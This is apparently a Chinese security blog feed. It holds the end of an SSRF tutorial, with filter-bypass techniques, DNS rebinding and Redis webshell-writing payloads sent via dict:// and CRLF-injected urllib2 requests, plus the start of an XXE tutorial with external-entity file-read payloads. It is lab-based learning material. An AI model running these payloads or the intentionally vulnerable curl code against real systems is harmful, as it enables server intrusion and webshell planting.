spellcheck="true">#IPv4与十进制互转</span>IPy<span class="token punctuation">.</span>IP<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>int<span class="token punctuation">(</span><span class="token punctuation">)</span> IPy<span class="token punctuation">.</span>IP<span class="token punctuation">(</span><span class="token string">'3689901706'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strNormal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#16进制转换</span>IPy<span class="token punctuation">.</span>IP<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strHex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#IPv4/6转换</span>IPy<span class="token punctuation">.</span>IP<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>v46map<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a>本地回环地址</h3><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>):</p><pre class="line-numbers language-x86asm"><code class="language-x86asm">http://127.0.0.1http://localhosthttp://127.255.255.254127.0.0.1 - 127.255.255.254http://[::1]http://[::ffff:7f00:1]http://[::ffff:127.0.0.1]http://127.1http://127.0.1http://0:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/8da64bbc49bab2a649e4532f19884baa.png"></p><h3 id="punycode转码"><a href="#punycode转码" class="headerlink" title="punycode转码"></a>punycode转码</h3><blockquote><p>IDN（英语：Internationalized Domain Name，缩写：IDN）即为国际化域名，又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。包括法语、阿拉伯语、中文、斯拉夫语、泰米尔语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编译而成。在域名系统中，国际化域名使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。punycode是一种表示Unicode码和ASCII码的有限的字符集，可对IDNs进行punycode转码，转码后的punycode就由26个字母+10个数字，还有“-”组成。</p></blockquote><p>使用在线的<a href="http://tools.jb51.net/punycode/index.php">编码工具</a>测试：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4e31634ab03d3d5e49c5d668b43cc0e1.png"></p><p>对正常的字母数字组成的域名，也可以使用punycode编码格式，即：</p><pre class="line-numbers language-html"><code class="language-html">www.qq.com =>  www.xn--qq-.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一些浏览器对正常的域名不会使用punycode解码，如Chrome，所以在Chrome中访问失败，测试了部分PHP中的函数，也会失败：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ba1ece4cd3b5208b68dcaf9e9b440cc2.png"><br>在Firefox90.0.2中可以访问成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/981c1f1a04eff196544caac82fc15406.gif"></p><p><em>同形异义字攻击（IDN_homograph_attack，IDN欺骗）</em><br>同形异义字指的是形状相似但是含义不同，这样的字符如希腊、斯拉夫、亚美尼亚字母，部分字符看起来和英文字母一模一样：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/8f1bba12cb4cf8405bb3bdc2ef5b16fe.png" alt="西里尔字母"><br>如果使用这些字符注册域名，很容易进行欺骗攻击(<a href="https://www.xudongz.com/blog/2017/idn-phishing/">点击查看详情</a>)，所以就出现了punycode转码，用来将含义特殊字符的域名编码为IDN，目前谷歌浏览器、Safari等浏览器会将存在多种语言的域名进行Punycode编码显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/3af26b8064396062ff502384084e6736.png"><br>但是在Firefox中的处理方式并没有很严格，如果域名主体部分全部使用某种特殊字符，如单独使用<a href="http://www.52unicode.com/cyrillic-zifu">西里尔字母</a>替换来绕过Firefox浏览器的过滤器。<br>在HOST中配置这样的解析，用来模拟DNS：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/54a4e3268a4143a64f4a9908201fd02f.png"><br>然后浏览器访问，可以看到地址栏显示了差不多的taobao.com。然后通过查看源码可以发现其IDN的显示(进行了Punycode编码)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/132b2739aa2e86160c1be683404e6b42.png"></p><h3 id="封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="封闭式字母数字 (Enclosed Alphanumerics)字符"></a>封闭式字母数字 (Enclosed Alphanumerics)字符</h3><p><a href="https://www.haomeili.net/ZhiShi/34">封闭式字母数字</a>是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p><pre class="line-numbers language-html"><code class="language-html">①    ②    ③    ④    ⑤    ⑥    ⑦    ⑧    ⑨    ⑩    ⑪    ⑫    ⑬    ⑭    ⑮    ⑯⑰    ⑱    ⑲    ⑳    Ⓐ    Ⓑ    Ⓒ    Ⓓ    Ⓔ    Ⓕ    Ⓖ    Ⓗ    Ⓘ    ⒿⓀ    Ⓛ    Ⓜ    Ⓝ    Ⓞ    Ⓟ    Ⓠ    Ⓡ    Ⓢ    Ⓣ    Ⓤ    Ⓥ    Ⓦ    Ⓧ    Ⓨ    Ⓩⓐ    ⓑ    ⓒ    ⓓ    ⓔ    ⓕ    ⓖ    ⓗ    ⓘ    ⓙ    ⓚ    ⓛ    ⓜ    ⓝ    ⓞ    ⓟⓠ    ⓡ    ⓢ    ⓣ    ⓤ    ⓥ    ⓦ    ⓧ    ⓨ    ⓩ    ⓪    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-groovy"><code class="language-groovy">http<span class="token punctuation">:</span><span class="token string">//</span>①②⑦<span class="token operator">.</span><span class="token number">0.0</span><span class="token operator">.</span><span class="token number">1</span>http<span class="token punctuation">:</span><span class="token string">//</span>ⒶⓟⓟⓛⒺ<span class="token operator">.</span>ⓒⓄⓂ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>浏览器访问时会自动识别成拉丁英文字符：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/fbe5532be134ca0f591156e74bf2c3f4.png"></p><h3 id="Redirect-重定向"><a href="#Redirect-重定向" class="headerlink" title="Redirect(重定向)"></a>Redirect(重定向)</h3><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。在github项目<a href="https://github.com/cujanovic/SSRF-Testing/">SSRF-Testing</a>上可以看到已经配置好的用例：</p><pre class="line-numbers language-html"><code class="language-html">https://ssrf.localdomain.pw/img-without-body/301-http-www.qq.com-.i.jpghttps://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpghttps://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端PHP代码如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com");</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h3><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p><pre class="line-numbers language-cmd"><code class="language-cmd">nslookup 127.0.0.1.nip.ionslookup owasp.org.127.0.0.1.nip.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/30b9d55e263842b3b258c1a96859aa88.png"></p><h3 id="DNS-rebinding-DNS重绑定"><a href="#DNS-rebinding-DNS重绑定" class="headerlink" title="DNS rebinding(DNS重绑定)"></a>DNS rebinding(DNS重绑定)</h3><p>如果某后端代码要发起外部请求，但是不允许对内部IP进行请求，就要对解析的IP进行安全限制，整个流程中首先是要请求一次域名对解析的IP进行检测，检测通过交给后面的函数发起请求。如果在第一次请求时返回公网IP,第二次请求时返回内网IP，就可以达到攻击效果，DNS重绑定一般可用于绕过浏览器同源策略和SSRF的过滤。要使得两次请求返回不同IP需要对DNS缓存进行控制，设置DNS TTL为0，测试cloudflare并不行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/6132b3b14e7783635bd5e7962b7e4525.png"><br>那么还可以自定义DNS服务器，这样就能方便控制每次解析的IP地址了，cloudflare中可以配置NS转发，在可控的VPS上使用SSRF-Testing项目中的dns.py脚本来处理DNS请求，执行<code>python3 dns.py 216.58.214.206 169.254.169.254 127.0.0.1 53 localdomains.pw</code>，在本地53端口开启DNS服务，为localdomains.pw指定两次解析IP，第一次是216.x，第二次是169.x。开启后使用<code>nslookup 1111.localdomains.pw 127.0.0.1</code>指定DNS服务器为127.0.0.1，查询解析记录：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f424305996dcb2c27e54bbedd301e94d.png"><br>这样一来，使用该工具就可以很方便的控制两次解析的IP了。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><pre class="line-numbers language-avrasm"><code class="language-avrasm">http://www。qq。comhttp://www｡qq｡comhttp://www．qq．com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="利用短地址绕过"><a href="#利用短地址绕过" class="headerlink" title="利用短地址绕过"></a>利用短地址绕过</h3><p>这个是利用互联网上一些网站提供的<a href="https://www.shorturl.at/">网址缩短</a>服务进行一些黑名单绕过，其原理也是利用重定向：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f15c0cfd2a556f4d27ce6d65e8368574.png"></p><h3 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h3><p>URL十六进制编码可被浏览器正常识别，编码脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>data <span class="token operator">=</span> <span class="token string">"www.qq.com"</span><span class="token punctuation">;</span>alist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        alist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"http://%"</span><span class="token operator">+</span><span class="token string">'%'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>alist<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c8c11adfde12b5e17d0d5e23b2ff2d67.png"></p><h2 id="0x06-SSRF的利用实例"><a href="#0x06-SSRF的利用实例" class="headerlink" title="0x06 SSRF的利用实例"></a>0x06 SSRF的利用实例</h2><h3 id="Redis未授权访问Getshell"><a href="#Redis未授权访问Getshell" class="headerlink" title="Redis未授权访问Getshell"></a>Redis未授权访问Getshell</h3><p>PHP SSRF漏洞代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 设置 URL 和相应的选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 抓取 URL 并把它传递给浏览器</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 关闭 cURL 资源，并且释放系统资源</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用DICT协议利用Redis写Webshell：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#  查询信息</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/info                          </span><span class="token shell-comment comment"># dict:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/auth:password (密码破解)</span><span class="token shell-comment comment"># 查询只读配置</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/CONFIG:GET:slave-read-only    </span><span class="token shell-comment comment"># 关闭只读配置</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/CONFIG:SET:slave-read-only:no   </span><span class="token shell-comment comment"># 查询备份目录</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/config:get:dir         </span><span class="token shell-comment comment"># 修改备份目录，目录值使用</span><span class="token string">""</span>，盘符中的<span class="token punctuation">:</span>用<span class="token number">16</span>进制编码为\<span class="token package">x3A</span>，\ <span class="token operator">=</span><span class="token operator">></span> \<span class="token package"><span class="token punctuation">\</span></span> 。dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/config:set:dir:"D\x3A\\phpstudy_pro\\WWW"</span><span class="token shell-comment comment"># 查询备份文件名    </span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/config:get:dbfilename     </span><span class="token shell-comment comment"># 设置备份文件名</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/config:set:dbfilename:w.php              </span><span class="token shell-comment comment">#设置键w的键值为16进制编码的&lt;?php phpinfo(); ?> </span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/set:w:"\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e"  </span><span class="token shell-comment comment"># 异步保存数据</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/BGSAVE</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token shell-comment comment"># 查询当前数据库key</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/DBSIZE     </span><span class="token shell-comment comment"># 如果脏数据过大导致webshell无法执行,可以清除当前数据库所有key(有风险)</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/flushall                         </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用Gopher协议利用Redis写Webshell:<br>将要执行的命令整体URL编码:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/5310088417592c70510eead611e3fcc2.png"><br>发起请求：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/25700f753cf10284ca1e84ad35f9606d.png"></p><p>如果SSRF的触发点错误的处理HTTP请求，那么也可以结合请求走私利用。比如python2的urllib2模块：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> urllib2url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>html <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/506efa2ac99f171ea3c96a5757237ab6.png"><br>利用redis写shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/495fb05f23dac828ba3835bde7bd5553.png"></p><h2 id="0x07-SSRF测试工具"><a href="#0x07-SSRF测试工具" class="headerlink" title="0x07 SSRF测试工具"></a>0x07 SSRF测试工具</h2><p><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap-master</a> - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/292f7cbbf33e6f327425ae1ef9f5f0b1.png"><br>帮助说明如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a2c9a0836d3f09355295d68673b81e3.png"></p><p><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing-master</a> - 常用的SSRF绕过测试<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d1d2e18e21355cd082602c708d984ef6.png"></p><p><a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a> - 将请求转换为gopher协议格式<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/97ae994b6040c78407f065ecdfaf9f37.png"></p><h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a href="https://www.shorturl.at/">https://www.shorturl.at/</a><br><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a><br><a href="https://github.com/cujanovic/SSRF-Testing/">https://github.com/cujanovic/SSRF-Testing/</a><br><a href="https://www.xudongz.com/blog/2017/idn-phishing/">https://www.xudongz.com/blog/2017/idn-phishing/</a><br><a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher</a><br><a href="https://zhuanlan.zhihu.com/p/269208311">七大主流的HttpClient程序比较</a><br><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">blind-ssrf-chains</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞基础</title>
      <link href="/2021/10/06/xxe-lou-dong-ji-chu/"/>
      <url>/2021/10/06/xxe-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>做为网络安全从业者，对大部分漏洞名称都熟悉，也大概知道怎么利用，能产生什么危害，比如本文要学习的XXE漏洞。在此之前，只知道这个漏洞是XML解析时存在了问题，引用了外部实体，利用可以用来读取文件、探测内网，某些情况还可以执行命令。但是代码中究竟存在了什么问题，怎么修复；XML实体是什么，都有哪些类型；XXE攻击的类型、利用环境和绕过等这些具体的问题就是只知其一不知其二了。本文基于JAVA的Webgoat漏洞环境来学习XXE漏洞基础知识和各种利用。</p><h2 id="0x02-XML外部实体攻击-XXE"><a href="#0x02-XML外部实体攻击-XXE" class="headerlink" title="0x02 XML外部实体攻击(XXE)"></a>0x02 XML外部实体攻击(XXE)</h2><blockquote><p>XML 外部实体攻击(XXE)是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。</p></blockquote><h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/05/63rbgyjlxPaFUOD.png"></p><h3 id="文档类型定义（DTD）"><a href="#文档类型定义（DTD）" class="headerlink" title="文档类型定义（DTD）"></a>文档类型定义（DTD）</h3><p>了解XML实体之前先熟悉下DTD，DTD 文件是一种特殊类型的 XML 文件，其中包含有关 XML 格式或结构的信息。它们用于在不同的、单独的 XML 文件之间建立一致性。这些 DTD 文件可以包含一个称为 ENTITY 的元素，DTD可以在XML内部也可以单独存在DTD文件中。XML实体在 DTD 中创建，实体可以利用协议进行系统调用。 内部的DOCTYPE声明：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>]>!DOCTYPE note     定义文档的类型是note;!ELEMENT note     定义note里的元素；!ELEMENT to         定义元素to的数据类型是#PCDATA，也可以用ANY;!ENTITY to             定义元素to的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>外部的DOCTYPE声明：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>独立的DTD文件,为XML中的DTD部分，直接保存为单独的.dtd文件：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="XML实体类型"><a href="#XML实体类型" class="headerlink" title="XML实体类型"></a>XML实体类型</h3><p>实体是对数据引用，须在DTD中定义。XML中引用实体的方式是<code>&amp;实体名称;</code>，一般来说需要了解的有下面几种类型：</p><h4 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h4><p>指用十进制格式<code>&amp;#37;</code>或十六进制格式<code>&amp;#x25;</code>来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。<code>&amp;#37; = &amp;#x25; = %</code>，在a中的值使用字符实体转码%定义参数实体b：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ENTITY % a "&lt;!ENTITY &amp;#x25; b SYSTEM 'http://127.0.0.1:8090/ewq'></span>">%a;%b;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>指ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体，如下XML:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&to;">&amp;to;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>ENTITY中关键字为SYSTEM, PUBLIC “id”格式，具体值是链接指向的文件内容，相当于一个包含效果，将远程的内容用一个内部实体存放到内部dtd中 ：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span 